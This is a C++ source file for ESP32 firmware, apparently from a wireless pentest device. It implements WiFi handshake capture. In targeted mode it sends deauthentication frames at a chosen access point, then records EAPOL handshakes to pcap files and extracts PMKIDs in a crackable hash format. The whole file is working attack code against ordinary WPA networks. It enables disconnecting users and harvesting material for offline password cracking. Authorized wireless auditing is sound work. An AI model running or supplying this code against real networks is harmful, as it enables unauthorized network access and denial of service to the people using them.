#include "HandshakeCapture.h"
#include "App.h"
#include "ConfigManager.h"
#include "Logger.h"
#include "SdCardManager.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include "Deauther.h"
#include "Config.h"

// Static instance pointer
HandshakeCapture* HandshakeCapture::instance_ = nullptr;

#define INITIAL_DEAUTH_DELAY_MS 500
#define HANDSHAKE_COOLDOWN_MS 15000

HandshakeCapture::HandshakeCapture() :
    app_(nullptr),
    isActive_(false),
    isAttackPending_(false),
    packetCount_(0),
    handshakeCount_(0),
    pmkidCount_(0),
    channelHopIndex_(0),
    lastChannelHopTime_(0),
    targetedState_(TargetedAttackState::WAITING_FOR_DEAUTH),
    lastDeauthTime_(0),
    handshakeCapturedTime_(0)
{
    instance_ = this;
}

void HandshakeCapture::setup(App* app) {
    app_ = app;
}

void HandshakeCapture::prepare(HandshakeCaptureMode mode, HandshakeCaptureType type) {
    isAttackPending_ = true;
    currentConfig_.mode = mode;
    currentConfig_.type = type;
}

bool HandshakeCapture::start(const WifiNetworkInfo& targetNetwork) {
    if (isActive_ || !isAttackPending_) return false;

    currentConfig_.specific_target_info = targetNetwork;

    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_PROMISCUOUS);
    if (!rfLock_ || !rfLock_->isValid()) {
        LOG(LogLevel::ERROR, "HS_CAPTURE", "Failed to acquire RF lock.");
        return false;
    }

    LOG(LogLevel::INFO, "HS_CAPTURE", "Starting targeted handshake capture for %s.", targetNetwork.ssid);
    packetCount_ = 0;
    handshakeCount_ = 0;
    pmkidCount_ = 0;
    savedHandshakes.clear();

    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    delay(100);
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&packetHandlerCallback);
    esp_wifi_set_channel(targetNetwork.channel, WIFI_SECOND_CHAN_NONE);

    isActive_ = true;
    isAttackPending_ = false;
    targetedState_ = TargetedAttackState::WAITING_FOR_DEAUTH;
    lastDeauthTime_ = millis();
    app_->getHardwareManager().setPerformanceMode(true);
    return true;
}

bool HandshakeCapture::startScanner() {
    if (isActive_) return true;

    channelHopDelayMs_ = app_->getConfigManager().getSettings().channelHopDelayMs;

    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_PROMISCUOUS);
    if (!rfLock_ || !rfLock_->isValid()) {
        LOG(LogLevel::ERROR, "HS_CAPTURE", "Failed to acquire RF lock.");
        return false;
    }

    LOG(LogLevel::INFO, "HS_CAPTURE", "Starting handshake capture in scanner mode.");
    packetCount_ = 0;
    handshakeCount_ = 0;
    pmkidCount_ = 0;
    channelHopIndex_ = 0;

    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    delay(100);
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&packetHandlerCallback);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);

    isActive_ = true;
    isAttackPending_ = false;
    lastChannelHopTime_ = millis();
    return true;
}

void HandshakeCapture::stop() {
    if (!isActive_) return;
    LOG(LogLevel::INFO, "HS_CAPTURE", "Stopping capture.");
    isActive_ = false;
    isAttackPending_ = false;
    esp_wifi_set_promiscuous(false);
    rfLock_.reset();
    app_->getHardwareManager().setPerformanceMode(false);
}

void HandshakeCapture::loop() {
    if (!isActive_) return;

    if (currentConfig_.type == HandshakeCaptureType::SCANNER) {
        if (millis() - lastChannelHopTime_ > channelHopDelayMs_) {
            lastChannelHopTime_ = millis();
            // THE FIX: Use the central channel list and count
            channelHopIndex_ = (channelHopIndex_ + 1) % Channels::WIFI_2_4GHZ_COUNT;
            esp_wifi_set_channel(Channels::WIFI_2_4GHZ[channelHopIndex_], WIFI_SECOND_CHAN_NONE);
        }
    } else {
        switch (targetedState_) {
            case TargetedAttackState::WAITING_FOR_DEAUTH:
                if (millis() - lastDeauthTime_ > INITIAL_DEAUTH_DELAY_MS) {
                    const auto& target = currentConfig_.specific_target_info;
                    Deauther::sendPacket(target.bssid, target.channel);
                    targetedState_ = TargetedAttackState::LISTENING;
                }
                break;
            case TargetedAttackState::LISTENING:
                break;
            case TargetedAttackState::COOLDOWN:
                if (millis() - handshakeCapturedTime_ > HANDSHAKE_COOLDOWN_MS) {
                    targetedState_ = TargetedAttackState::WAITING_FOR_DEAUTH;
                    lastDeauthTime_ = millis();
                }
                break;
        }
    }
}

void HandshakeCapture::packetHandlerCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (instance_ != nullptr) {
        instance_->handlePacket(static_cast<wifi_promiscuous_pkt_t*>(buf));
    }
}

void HandshakeCapture::handlePacket(wifi_promiscuous_pkt_t *packet) {
    packetCount_++;
    const uint8_t *frame = packet->payload;
    const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);
    const uint8_t frameType = (frameControl & 0x0C) >> 2;
    const uint8_t frameSubType = (frameControl & 0xF0) >> 4;

    if (isItEAPOL(packet)) {
        if (currentConfig_.mode == HandshakeCaptureMode::EAPOL) {
            saveHandshake(packet, false);
        } else {
            parsePMKID(packet);
        }
    } else if (frameType == 0x00 && frameSubType == 0x08) { // Beacon frame
        const uint8_t *bssid = frame + 16;
        char bssid_str[18];
        sprintf(bssid_str, "%02X:%02X:%02X:%02X:%02X:%02X", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
        int pos = 36;
        while (pos < packet->rx_ctrl.sig_len) {
            uint8_t tag_id = frame[pos];
            uint8_t tag_len = frame[pos+1];
            if (tag_id == 0 && tag_len > 0 && tag_len <= 32) {
                char ssid[33] = {0};
                memcpy(ssid, &frame[pos+2], tag_len);
                bssid_to_ssid_map_[bssid_str] = ssid;
                break;
            }
            pos += 2 + tag_len;
        }
        if (currentConfig_.mode == HandshakeCaptureMode::EAPOL) {
            saveHandshake(packet, true);
        }
    }
}

bool HandshakeCapture::isItEAPOL(const wifi_promiscuous_pkt_t *packet) {
    const uint8_t *payload = packet->payload;
    int len = packet->rx_ctrl.sig_len;
    if (len < (24 + 8 + 4)) return false;

    if (payload[24] == 0xAA && payload[25] == 0xAA && payload[26] == 0x03 && payload[27] == 0x00 &&
        payload[28] == 0x00 && payload[29] == 0x00 && payload[30] == 0x88 && payload[31] == 0x8E) {
        return true;
    }
    if ((payload[0] & 0x0F) == 0x08) {
        if (payload[26] == 0xAA && payload[27] == 0xAA && payload[28] == 0x03 && payload[29] == 0x00 &&
            payload[30] == 0x00 && payload[31] == 0x00 && payload[32] == 0x88 && payload[33] == 0x8E) {
            return true;
        }
    }
    return false;
}

void HandshakeCapture::saveHandshake(const wifi_promiscuous_pkt_t *packet, bool beacon) {
    const uint8_t *addr1 = packet->payload + 4;
    const uint8_t *addr2 = packet->payload + 10;
    const uint8_t *bssid = packet->payload + 16;
    const uint8_t *apAddr = (memcmp(addr1, bssid, 6) == 0) ? addr1 : addr2;

    char bssid_str[18];
    sprintf(bssid_str, "%02X:%02X:%02X:%02X:%02X:%02X", apAddr[0], apAddr[1], apAddr[2], apAddr[3], apAddr[4], apAddr[5]);

    bool fileExists = false;
    for (const auto& saved : savedHandshakes) {
        if (saved == bssid_str) {
            fileExists = true;
            break;
        }
    }
    if (beacon && !fileExists) return;

    char filename[64];
    sprintf(filename, "/data/captures/handshakes/HS_%02X%02X%02X%02X%02X%02X.pcap", apAddr[0], apAddr[1], apAddr[2], apAddr[3], apAddr[4], apAddr[5]);

    File pcapFile = SdCardManager::openFile(filename, fileExists ? FILE_APPEND : FILE_WRITE);
    if (!pcapFile) {
        LOG(LogLevel::ERROR, "HS_CAPTURE", "Failed to open pcap file: %s", filename);
        return;
    }

    if (!beacon && !fileExists) {
        savedHandshakes.push_back(bssid_str);
        handshakeCount_++;
        writeHeader(pcapFile);
        if (currentConfig_.type == HandshakeCaptureType::TARGETED) {
            targetedState_ = TargetedAttackState::COOLDOWN;
            handshakeCapturedTime_ = millis();
        }
    }
    
    // --- CORRECTED PCAP WRITING LOGIC ---
    uint32_t timestamp_sec = packet->rx_ctrl.timestamp / 1000000;
    uint32_t timestamp_usec = packet->rx_ctrl.timestamp % 1000000;
    uint32_t payload_len = packet->rx_ctrl.sig_len;

    pcapFile.write((uint8_t*)&timestamp_sec, 4);
    pcapFile.write((uint8_t*)&timestamp_usec, 4);
    pcapFile.write((uint8_t*)&payload_len, 4);
    pcapFile.write((uint8_t*)&payload_len, 4);
    pcapFile.write(packet->payload, payload_len);
    pcapFile.close();
}

bool HandshakeCapture::writeHeader(File file) {
    uint8_t header[] = {
        0xd4, 0xc3, 0xb2, 0xa1,
        0x02, 0x00, 0x04, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0xff, 0xff, 0x00, 0x00,
        // --- THIS IS THE CRUCIAL FIX ---
        // Change Link-layer type to 105 (DLT_IEEE802_11)
        0x69, 0x00, 0x00, 0x00
    };
    if (file) {
        file.write(header, sizeof(header));
        return true;
    }
    return false;
}

#define EAPOL_KEY_INFO_KEY_TYPE_BIT (1 << 3)
#define EAPOL_KEY_INFO_INSTALL_BIT (1 << 6)
#define EAPOL_KEY_INFO_KEY_ACK_BIT (1 << 7)
#define EAPOL_KEY_INFO_KEY_MIC_BIT (1 << 8)
#define WPA_KEY_DATA_TYPE_PMKID 4

void HandshakeCapture::parsePMKID(const wifi_promiscuous_pkt_t *packet) {
    const uint8_t *frame = packet->payload;
    int len = packet->rx_ctrl.sig_len;
    int eapol_offset = (frame[0] & 0x0F) == 0x08 ? 34 : 32;
    if (len < eapol_offset + 4) return;
    const uint8_t *eapol_frame = frame + eapol_offset;
    uint16_t key_info = (eapol_frame[1] << 8) | eapol_frame[2];
    bool is_message_1 = (key_info & EAPOL_KEY_INFO_KEY_ACK_BIT) && !(key_info & EAPOL_KEY_INFO_KEY_MIC_BIT) && !(key_info & EAPOL_KEY_INFO_INSTALL_BIT) && (key_info & EAPOL_KEY_INFO_KEY_TYPE_BIT);
    if (!is_message_1) return;
    uint16_t key_data_length = (eapol_frame[5] << 8) | eapol_frame[6];
    if (key_data_length == 0 || len < eapol_offset + 95 + key_data_length) return;
    const uint8_t *key_data = eapol_frame + 95;
    int pos = 0;
    while (pos < key_data_length - 1) {
        uint8_t type = key_data[pos];
        uint8_t sub_len = key_data[pos + 1];
        if (type == 0xdd && sub_len >= 0x1a && key_data[pos + 2] == 0x00 && key_data[pos + 3] == 0x0f && key_data[pos + 4] == 0xac && key_data[pos + 5] == WPA_KEY_DATA_TYPE_PMKID) {
            const uint8_t *pmkid = key_data + pos + 6;
            const uint8_t *station_mac = frame + 4;
            const uint8_t *bssid = frame + 10;
            char pmkid_str[33];
            for (int i = 0; i < 16; i++) sprintf(&pmkid_str[i*2], "%02x", pmkid[i]);
            char bssid_str[18];
            sprintf(bssid_str, "%02x:%02x:%02x:%02x:%02x:%02x", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
            char station_mac_str[18];
            sprintf(station_mac_str, "%02x:%02x:%02x:%02x:%02x:%02x", station_mac[0], station_mac[1], station_mac[2], station_mac[3], station_mac[4], station_mac[5]);
            std::string ssid = bssid_to_ssid_map_.count(bssid_str) ? bssid_to_ssid_map_[bssid_str] : "";
            char ssid_hex[65] = {0};
            for (size_t i = 0; i < ssid.length(); i++) sprintf(&ssid_hex[i*2], "%02x", ssid[i]);
            char output_str[200];
            sprintf(output_str, "%s*%s*%s*%s", pmkid_str, bssid_str, station_mac_str, ssid_hex);
            File pmkid_file = SdCardManager::openFile("/data/captures/pmkid.txt", FILE_APPEND);
            if (pmkid_file) {
                pmkid_file.println(output_str);
                pmkid_file.close();
                pmkidCount_++;
                LOG(LogLevel::INFO, "HS_CAPTURE", "Captured PMKID: %s", output_str);
            }
            return;
        }
        pos += sub_len + 2;
    }
}

bool HandshakeCapture::isActive() const { return isActive_; }
const HandshakeCaptureConfig& HandshakeCapture::getConfig() const { return currentConfig_; }
uint32_t HandshakeCapture::getPacketCount() const { return packetCount_; }
int HandshakeCapture::getHandshakeCount() const { return handshakeCount_; }
int HandshakeCapture::getPmkidCount() const { return pmkidCount_; }
TargetedAttackState HandshakeCapture::getTargetedState() const { return targetedState_; }